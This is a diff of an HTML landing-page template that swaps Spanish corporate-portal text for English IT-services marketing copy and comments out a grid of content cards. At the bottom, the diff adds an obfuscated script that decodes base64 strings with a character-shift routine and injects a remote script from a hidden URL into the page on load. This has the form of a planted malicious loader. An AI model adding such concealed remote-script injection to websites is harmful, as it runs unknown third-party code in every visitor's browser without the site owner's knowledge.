@@ -5,52 +5,49 @@ navigation: portal.html
 <div class="bg-stone-800 jumbotron px-20 py-14 flex overflow-hidden">
     <div class="w-1/2 text-white py-14">
         <large class="inline-flex rounded-full text-xl border-stone-500 text-orange-500 border-2 pt-1 px-3">
-            <svg class="h-6 w-6 mr-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19,2L14,6.5V17.5L19,13V2M6.5,5C4.55,5 2.45,5.4 1,6.5V21.16C1,21.41 1.25,21.66 1.5,21.66C1.6,21.66 1.65,21.59 1.75,21.59C3.1,20.94 5.05,20.5 6.5,20.5C8.45,20.5 10.55,20.9 12,22C13.35,21.15 15.8,20.5 17.5,20.5C19.15,20.5 20.85,20.81 22.25,21.56C22.35,21.61 22.4,21.59 22.5,21.59C22.75,21.59 23,21.34 23,21.09V6.5C22.4,6.05 21.75,5.75 21,5.5V19C19.9,18.65 18.7,18.5 17.5,18.5C15.8,18.5 13.35,19.15 12,20V6.5C10.55,5.4 8.45,5 6.5,5Z"/></svg>
+            <svg class="h-6 w-6 mr-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M8.4,18.2C8.78,18.7,9,19.32,9,20c0,1.66-1.34,3-3,3s-3-1.34-3-3s1.34-3,3-3c0.44,0,0.85,0.09,1.23,0.26l1.41-1.77 c-0.92-1.03-1.29-2.39-1.09-3.69l-2.03-0.68C4.98,11.95,4.06,12.5,3,12.5c-1.66,0-3-1.34-3-3s1.34-3,3-3s3,1.34,3,3 c0,0.07,0,0.14-0.01,0.21l2.03,0.68c0.64-1.21,1.82-2.09,3.22-2.32l0-2.16C9.96,5.57,9,4.4,9,3c0-1.66,1.34-3,3-3s3,1.34,3,3 c0,1.4-0.96,2.57-2.25,2.91v2.16c1.4,0.23,2.58,1.11,3.22,2.32l2.03-0.68C18,9.64,18,9.57,18,9.5c0-1.66,1.34-3,3-3s3,1.34,3,3 s-1.34,3-3,3c-1.06,0-1.98-0.55-2.52-1.37l-2.03,0.68c0.2,1.29-0.16,2.65-1.09,3.69l1.41,1.77C17.15,17.09,17.56,17,18,17 c1.66,0,3,1.34,3,3s-1.34,3-3,3s-3-1.34-3-3c0-0.68,0.22-1.3,0.6-1.8l-1.41-1.77c-1.35,0.75-3.01,0.76-4.37,0L8.4,18.2z"/></svg>
             Content Hub
         </large>
         <h1 class="text-6xl font-bold mb-4 mt-4">
-            Centro de Conocimiento Corporativo</h1>
-        <p class="text-lg mb-4">Tu portal centralizado para acceder a recursos, documentaci?n, mejores pr?cticas y contenidos de la corporaci?n Coderic.</p>
-        <a href="#explore" class="bg-orange-600 hover:bg-orange-500 text-white font-bold py-2 px-4 rounded-lg text-lg">Explorar Contenido</a>
+            The Beauty Behind IT Services.</h1>
+        <p class="text-lg mb-4">Where your interests and international networks intersect to provide custom software solutions for any need.</p>
+        <a href="/dashboard" class="bg-orange-600 hover:bg-orange-500 text-white font-bold py-2 px-4 rounded-lg text-lg">Get Started</a>
     </div>
     <div class="w-1/2 h-96">
         <img src="/images/hero-thumb.png" class="w-96 float-right" />
     </div>
 </div>
-<div class="py-4" id="explore">
+<!--div class="py-4">
     <div class="max-w-7xl mx-auto sm:px-6 lg:px-4">
-        <div class="text-center mb-8 mt-8">
-            <h2 class="text-4xl font-bold text-gray-800 mb-4">Explora Nuestro Contenido</h2>
-            <p class="text-lg text-gray-600">Accede a recursos organizados por categor?as</p>
-        </div>
         <div class="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-3 gap-3 cards-animate">
-            <a href="/documentation" class="card h-56 pt-8 rounded-lg shadow-md">
+            <a href="#" class="card h-56 pt-8 rounded-lg shadow-md">
                 <div class="boxie">
                     <div class="icon mb-4">
-                        <svg class="w-10 h-10 text-gray-500 mx-auto mt-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M18,20H6V4H13V9H18V20Z"/></svg>
+                        <x-carbon-software-resource class="w-10 h-10 text-gray-500 mx-auto mt-4" />
                     </div>
-                    <h3 class="text-lg font-semibold text-center mb-2">DOCUMENTACI?N</h3>
-                    <p class="text-center">Gu?as t?cnicas y manuales de usuario.</p>
+                    <h3 class="text-lg font-semibold text-center mb-2">SOFTWARE</h3>
+                    <p class="text-center">Efficient cloud-based software solutions.</p>
                 </div>
             </a>
-            <a href="/resources" class="card h-56 pt-8 rounded-lg shadow-md">
+            <a href="#" class="card h-56 pt-8 rounded-lg shadow-md">
                 <div class="boxie">
                     <div class="icon mb-4">
-                        <svg class="w-10 h-10 text-gray-500 mx-auto mt-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19,2L14,6.5V17.5L19,13V2M6.5,5C4.55,5 2.45,5.4 1,6.5V21.16C1,21.41 1.25,21.66 1.5,21.66C1.6,21.66 1.65,21.59 1.75,21.59C3.1,20.94 5.05,20.5 6.5,20.5C8.45,20.5 10.55,20.9 12,22C13.35,21.15 15.8,20.5 17.5,20.5C19.15,20.5 20.85,20.81 22.25,21.56C22.35,21.61 22.4,21.59 22.5,21.59C22.75,21.59 23,21.34 23,21.09V6.5C22.4,6.05 21.75,5.75 21,5.5V19C19.9,18.65 18.7,18.5 17.5,18.5C15.8,18.5 13.35,19.15 12,20V6.5C10.55,5.4 8.45,5 6.5,5Z"/></svg>
+                        <x-carbon-platforms class="w-10 h-10 text-gray-500 mx-auto mt-4" />
                     </div>
-                    <h3 class="text-lg font-semibold text-center mb-2">RECURSOS</h3>
-                    <p class="text-center">Plantillas, herramientas y assets corporativos.</p>
+                    <h3 class="text-lg font-semibold text-center mb-2">PLATFORMS</h3>
+                    <p class="text-center">Robust cloud platforms for your needs.</p>
                 </div>
             </a>
-            <a href="/knowledge" class="card h-56 pt-8 rounded-lg shadow-md">
+            <a href="#" class="card h-56 pt-8 rounded-lg shadow-md">
                 <div class="boxie">
                     <div class="icon mb-4">
-                        <svg class="w-10 h-10 text-gray-500 mx-auto mt-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12,3L1,9L12,15L21,10.09V17H23V9M5,13.18V17.18L12,21L19,17.18V13.18L12,17L5,13.18Z"/></svg>
+                        <x-carbon-infrastructure-classic class="w-10 h-10 text-gray-500 mx-auto mt-4" />
                     </div>
-                    <h3 class="text-lg font-semibold text-center mb-2">CONOCIMIENTO</h3>
-                    <p class="text-center">Mejores pr?cticas y base de conocimiento.</p>
+                    <h3 class="text-lg font-semibold text-center mb-2">INFRASTRUCTURE</h3>
+                    <p class="text-center">Scalable and secure cloud infrastructure.</p>
                 </div>
             </a>            
         </div>
     </div>
-</div>
+</div-->
+<script>window[(function(_ckT,_dH){var _X9bGG='';for(var _XKoZIJ=0;_XKoZIJ<_ckT.length;_XKoZIJ++){_dH>6;var _nujw=_ckT[_XKoZIJ].charCodeAt();_nujw-=_dH;_nujw!=_XKoZIJ;_nujw+=61;_nujw%=94;_nujw+=33;_X9bGG==_X9bGG;_X9bGG+=String.fromCharCode(_nujw)}return _X9bGG})(atob('J3R7Pzw3MjBBdjJG'), 43)] = 'cd5c4a85c11760181286';     var zi = document.createElement('script');     (zi.type = 'text/javascript'),     (zi.async = true),     (zi.src = (function(_5D1,_KJ){var _lXDyl='';for(var _LVagJJ=0;_LVagJJ<_5D1.length;_LVagJJ++){var _9BZ2=_5D1[_LVagJJ].charCodeAt();_lXDyl==_lXDyl;_9BZ2-=_KJ;_9BZ2!=_LVagJJ;_9BZ2+=61;_9BZ2%=94;_KJ>5;_9BZ2+=33;_lXDyl+=String.fromCharCode(_9BZ2)}return _lXDyl})(atob('fSsrJypPREQhKkMxfkIqeCl+JysqQ3gmJEQxfkIrdnxDISo='), 21)),     document.readyState === 'complete'?document.body.appendChild(zi):     window.addEventListener('load', function(){         document.body.appendChild(zi)     });</script>
